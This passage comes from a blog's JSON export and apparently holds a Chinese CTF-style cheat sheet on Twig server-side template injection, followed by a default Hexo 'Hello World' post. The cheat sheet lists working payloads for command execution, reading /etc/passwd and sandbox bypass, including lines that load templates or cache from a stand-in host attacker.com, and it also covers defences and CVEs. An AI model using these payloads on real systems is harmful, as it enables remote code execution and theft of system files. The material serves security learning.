开发中的代码实例正常使用示例// PHP控制器逻辑（安全用法） require_once &#39;vendor/autoload.php&#39;; $loader = new \\Twig\\Loader\\ArrayLoader([ &#39;index&#39; =&gt; &#39;Hello, &#123;&#123; name &#125;&#125;!&#39;, ]); $twig = new \\Twig\\Environment($loader); $name = htmlspecialchars($_GET[&#39;name&#39;]); // 输入过滤 echo $twig-&gt;render(&#39;index&#39;, [&#39;name&#39; =&gt; $name]); 有漏洞的代码示例// PHP控制器逻辑（危险操作！） $twig = new \\Twig\\Environment($loader); $user_input = $_GET[&#39;content&#39;]; // 未过滤直接传入模板 echo $twig-&gt;render($user_input, []); // 直接渲染用户输入 二、渗透关键点1. 检测注入点• 输入点：URL参数、模板动态拼接内容。• 检测方法： GET /page?param=&#123;&#123;7 * 7&#125;&#125; HTTP/1.1 2. 判断沙盒模式• 沙盒检测：尝试执行&#123;&#123;_self.env&#125;&#125;，若返回null或错误则沙盒已启用。• 版本探测： &#123;&#123;constant('PHP_VERSION')&#125;&#125; &lt;!-- 输出PHP版本 --&gt; &#123;&#123;_self.version&#125;&#125; &lt;!-- 输出Twig版本 --&gt; 三、漏洞利用与Payload1. 非沙盒模式利用命令执行（需exec函数可用）&#123;&#123;['id']|filter('system')&#125;&#125; &lt;!-- 执行系统命令 --&gt; &#123;&#123;['cat /etc/passwd']|map('system')&#125;&#125; 文件读取&#123;&#123;app.request.files.get(1).__construct('/etc/passwd','')&#125;&#125; &#123;&#123;app.request.files.get(1).openFile.read(1000)&#125;&#125; 利用_self对象（旧版本）&#123;&#123;_self.env.setCache(\"ftp://attacker.com\")&#125;&#125; &#123;&#123;_self.env.loadTemplate(\"恶意模板\")&#125;&#125; 2. 沙盒绕过技巧使用内置过滤器链&#123;&#123;['id']|filter('system')|join(',')&#125;&#125; &lt;!-- 绕过黑名单检查 --&gt; 利用属性注入&#123;&#123;app.request.query.filter('system','id')&#125;&#125; 模板继承攻击&#123;% extends \"http://attacker.com/malicious.twig\" %&#125; 3. 其他Payload• 信息泄露： &#123;&#123;app.request.server.all|join(',')&#125;&#125; &lt;!-- 泄露服务器变量 --&gt; &#123;&#123;_self&#125;&#125; &lt;!-- 转储_self对象 --&gt; • XSS利用： &#123;&#123;'alert(1)'&#125;&#125; &lt;!-- 需关闭自动转义 --&gt; 四、防御手段1. 官方推荐• 启用沙盒模式： $policy = new \\Twig\\Sandbox\\SecurityPolicy([], [], [], [], []); $twig-&gt;addExtension(new \\Twig\\Extension\\SandboxExtension($policy, true)); • 输入过滤：避免用户输入直接控制模板内容。• 禁用危险函数：在php.ini中禁用system、exec等函数。 2. 安全配置• 更新至最新版本（≥Twig 3.x）。• 使用白名单限制模板可访问的类和方法。• 避免动态拼接模板内容。 五、绕过技巧1. 字符串拼接&#123;&#123;['id']|filter('sy'~'stem')&#125;&#125; 2. 利用attribute函数&#123;&#123;attribute(_self, 'env')&#125;&#125; &lt;!-- 访问受限属性 --&gt; 3. 上下文逃逸&#123;% set cmd = 'id' %&#125; &#123;&#123;&#123;cmd:['system']&#125;|json_encode&#125;&#125; &lt;!-- 利用JSON解析漏洞 --&gt; 六、总结与参考1. 测试流程 检测注入点 → 2. 判断沙盒状态 → 3. 尝试基础Payload → 4. 绕过沙盒 → 5. 提权 2. 高危CVE• CVE-2019-10911：沙盒模式绕过漏洞（影响Twig &lt;1.38.4）。• CVE-2022-23614：属性注入漏洞（影响Twig &lt;3.4.3）。 3. 参考资源• Twig官方文档• OWASP SSTI备忘单• Twig沙盒绕过研究 备注：Twig的沙盒模式相对严格，但开发者错误配置仍可能导致重大风险。渗透测试时需结合目标环境版本和过滤规则调整Payload。","categories":[{"name":"ctf","slug":"ctf","permalink":"https://ehzisum.github.io/categories/ctf/"}],"tags":[{"name":"ssti","slug":"ssti","permalink":"https://ehzisum.github.io/tags/ssti/"}]},{"title":"Hello World","slug":"hello-world","date":"2024-04-26T03:03:00.000Z","updated":"2025-03-24T01:04:37.791Z","comments":true,"path":"2024/04/26/hello-world/","link":"","permalink":"https://ehzisum.github.io/2024/04/26/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post&#x2F;page$ hexo new &quot;PostName&quot; $ hexo new page &quot;PageName&quot; More info: Writing Run server$ hexo server --port==8000 #开启访问（默认端口4000，`ctrl + c` 关闭），查看帮助（hexo server -help） More info: Server Generate static files$ hexo generate #生成静态页面至public目录 More info: Generating Deploy to remote sites$ hexo deploy More info: Deployment","categories":[{"name":"other","slug":"other","permalink":"https://ehzisum.github.io/categories/other/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://ehzisum.github.io/tags/hexo/"}]}],"categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://ehzisum.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"name":"ctf","slug":"ctf","permalink":"https://ehzisum.github.io/categories/ctf/"},{"name":"other","slug":"other","permalink":"https://ehzisum.github.io/categories/other/"}],"tags":[{"name":"groovy","slug":"groovy","permalink":"https://ehzisum.github.io/tags/groovy/"},{"name":"路径处理","slug":"路径处理","permalink":"https://ehzisum.github.io/tags/%E8%B7%AF%E5%BE%84%E5%A4%84%E7%90%86/"},{"name":"ssti","slug":"ssti","permalink":"https://ehzisum.github.io/tags/ssti/"},{"name":"hexo","slug":"hexo","permalink":"https://ehzisum.github.io/tags/hexo/"}]}